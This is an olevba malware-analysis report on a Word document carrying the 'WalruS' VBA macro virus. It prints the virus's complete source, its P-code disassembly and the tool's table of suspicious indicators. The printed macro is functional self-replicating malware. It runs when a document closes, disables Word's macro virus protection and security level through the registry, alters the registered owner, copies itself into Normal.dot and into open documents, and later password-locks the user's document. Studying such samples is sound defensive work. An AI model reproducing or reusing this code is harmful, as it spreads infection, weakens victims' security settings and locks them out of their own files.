olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Fool.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Fool.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetTickCount Lib "Kernel32" () As Long
Private Sub Document_Close()
' WalruS Virus 11/00
On Error Resume Next
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
DropPath = ("C:\WalruS.drv")
RunTime = Format(GetTickCount / 60000, "0")
VBProject.VBComponents(1).Export DropPath
Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Application.DisplayStatusBar = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "WalruS"
If nt.CountOfLines = 0 Then
    nt.AddFromFile DropPath: nt.DeleteLines 1, 4: nt.replaceline 30, "Sub ToolsMacro(): End Sub"
End If
If ad.CountOfLines = 0 Then
    ad.AddFromFile DropPath: ad.DeleteLines 1, 4: ad.replaceline 30, "Sub ViewVBCode(): End Sub"
    ActiveDocument.Save
End If
If RunTime > 300 Then
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, "The WalruS", _
        "Arial Black", 72#, msoFalse, msoFalse, 73.75, 129.3).Select
    ActiveDocument.Protect Password:=Application.UserName, NoReset:=False, Type:= _
        wdAllowOnlyComments
    ActiveDocument.Save
End If
Kill DropPath
End Sub
Sub ToolsMacro(): End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Fool.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3514 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetTickCount Lib "Kernel32" () As Long)
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	QuoteRem 0x0000 0x0013 " WalruS Virus 11/00"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #5:
' 	LitStr 0x000D "C:\WalruS.drv"
' 	Paren 
' 	St DropPath 
' Line #6:
' 	Ld GetTickCount 
' 	LitDI4 0xEA60 0x0000 
' 	Div 
' 	LitStr 0x0001 "0"
' 	ArgsLd Format$ 0x0002 
' 	St RunTime 
' Line #7:
' 	Ld DropPath 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #10:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #11:
' 	LitStr 0x0006 "WalruS"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #12:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #13:
' 	Ld DropPath 
' 	Ld nt 
' 	ArgsMemCall AddFromFile 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x001E 
' 	LitStr 0x0019 "Sub ToolsMacro(): End Sub"
' 	Ld nt 
' 	ArgsMemCall replaceline 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld DropPath 
' 	Ld ad 
' 	ArgsMemCall AddFromFile 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x001E 
' 	LitStr 0x0019 "Sub ViewVBCode(): End Sub"
' 	Ld ad 
' 	ArgsMemCall replaceline 0x0002 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld RunTime 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #21:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld msoTextEffect29 
' 	LitStr 0x000A "The WalruS"
' 	LitStr 0x000B "Arial Black"
' 	LitR8 0x0000 0x0000 0x0000 0x4052 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0x0000 0x0000 0x7000 0x4052 
' 	LitR8 0x999A 0x9999 0x2999 0x4060 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #22:
' 	LineCont 0x0004 0F 00 08 00
' 	Ld Application 
' 	MemLd UserName 
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed NoReset 
' 	Ld wdAllowOnlyComments 
' 	ParamNamed TypeOf 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #23:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	Ld DropPath 
' 	ArgsCall Kill 0x0001 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub ToolsMacro())
' 	BoS 0x0000 
' 	EndSub 
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

